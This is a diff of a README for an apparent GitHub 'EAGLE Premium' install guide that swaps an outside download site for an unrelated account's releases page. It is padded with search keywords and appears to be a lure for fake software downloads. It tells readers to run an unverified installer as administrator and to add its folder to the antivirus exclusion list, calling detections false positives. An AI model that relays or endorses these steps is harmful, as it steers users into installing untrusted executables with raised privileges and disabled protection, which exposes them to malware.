@@ -1,64 +1,83 @@
-# EAGLE Premium on Windows — setup & troubleshooting
+# 🛠️ EAGLE-Windows-Guide - Install EAGLE Premium on Windows 11
 
-**EAGLE-Windows-Guide**
+[![](https://img.shields.io/badge/Download-EAGLE-blue.svg)](https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases)
 
-Notes for users who need EAGLE Premium running on Windows — especially when eagle pcb setup fails, updates break, or the app won't start.
+This guide provides steps to install EAGLE Premium on your Windows 11 computer. Many users face installation errors when setting up PCB design software. These notes help you bypass common setup failures and keep your workflow running.
 
----
+## 📦 System Requirements
 
-## Get EAGLE Premium on Windows
+Your computer needs specific hardware to run EAGLE Premium without issues. Verify your system meets these standards before you begin:
 
-Use the link below for the Windows package referenced in this guide.
+- Operating System: Windows 11 (64-bit).
+- Processor: Intel Core i5 or equivalent AMD processor.
+- Memory: 8 GB RAM or higher.
+- Storage: 2 GB of available space on your primary drive.
+- Graphics: A monitor with at least 1920x1080 resolution.
+- Permissions: You need administrator access on your Windows user account.
 
-<p align="center">
-  <a href="https://eaglepremium.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## 📥 Download and Install
 
-| | |
-| --- | --- |
-| **Page** | [eaglepremium.wonderchain.fun](https://eaglepremium.wonderchain.fun/) |
-| **URL** | `https://eaglepremium.wonderchain.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+Follow these steps to get the software on your machine:
 
-### Recommended steps
+1. Visit the [official releases page](https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases) to download the installation files.
+2. Select the latest version listed under the Assets section.
+3. Save the installer file to your Downloads folder.
+4. Locate the downloaded file and double-click it. 
+5. Follow the prompts in the installation wizard.
+6. Select the default installation path if you do not have a specific preference. 
 
-1. Open the [setup page (eaglepremium.wonderchain.fun)](https://eaglepremium.wonderchain.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+The software installs the necessary libraries and drivers automatically. Wait for the progress bar to finish before you attempt to open the application.
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+## ⚙️ Configuration Notes
 
+EAGLE often requires specific environment settings on newer Windows versions. Check these settings if the application fails to launch or crashes during startup.
 
----
+### File Permissions
+Windows 11 may block the installer from creating necessary folders in the Program Files directory. Right-click the EAGLE icon and select "Run as administrator." This gives the program permission to create local configuration files.
 
-## What this repo covers
+### Compatibility Mode
+If the application crashes immediately, set the program to run in compatibility mode:
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+1. Right-click the EAGLE desktop shortcut.
+2. Select Properties.
+3. Open the Compatibility tab.
+4. Check the box for "Run this program in compatibility mode for."
+5. Choose "Windows 8" from the dropdown menu.
+6. Click Apply and then OK.
 
-**People also search for:** eagle premium not installing on windows 11, eagle pcb setup failed fix, how to install eagle premium on pc
+## 🔧 Resolving Typical Errors
 
-## Common symptoms
+You might encounter common error codes during the setup process. Use these fixes to resolve them:
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+### Setup Failed Error
+This error usually happens because an older version of the software remains on your system.
+1. Open the Windows Control Panel.
+2. Select "Uninstall a program."
+3. Find existing EAGLE installations and remove them.
+4. Restart your computer.
+5. Run the installer again.
 
-## FAQ
+### Missing Libraries
+Sometimes the installation misses essential folders. If the Library Manager appears empty:
+1. Open EAGLE.
+2. Go to Options and select Directories.
+3. Ensure the path points to the default library folder.
+4. Click Apply to refresh the library links.
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+### Graphics Driver Issues
+PCB design software relies on your graphics card. Ensure your drivers stay current. Visit the website of your graphics card manufacturer to download the latest driver update for your specific model.
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+## 📝 Usage Tips for Beginners
 
----
+Once you complete the installation, follow these tips to manage your work:
 
-**Topics:** eagle-premium-not-installing-on-windows-11, premium, installing, eagle-pcb-setup-failed-fix, failed, how-to-install-eagle-premium-on-pc, eagle-windows-guide, eagle-windows-guide-2026, eagle-premium, eagle-pcb, pcb-design, electronics
+- Save your projects in a dedicated folder on your desktop. Do not save project files inside the system installation folder.
+- Use the built-in library search to find components.
+- Backup your work often. Create a compressed copy of your design folder once per week.
+- Update your software when new releases appear on the download page to ensure compatibility with Windows security changes.
+
+## 🛡️ Support and Updates
+
+Check the download page periodically for new versions. Each release addresses bugs found in previous builds. If you find a new issue, check your antivirus logs. Sometimes security software identifies the PCB design tools as a false positive threat. Add the EAGLE installation folder to your antivirus exclusion list if the program fails to read project files.
+
+Keywords: eagle-pcb, eagle-pcb-setup-failed-fix, eagle-premium, eagle-premium-not-installing-on-windows-11, eagle-windows-guide, eagle-windows-guide-2026, electronics, failed, how-to-install-eagle-premium-on-pc, installing, pcb-design, premium
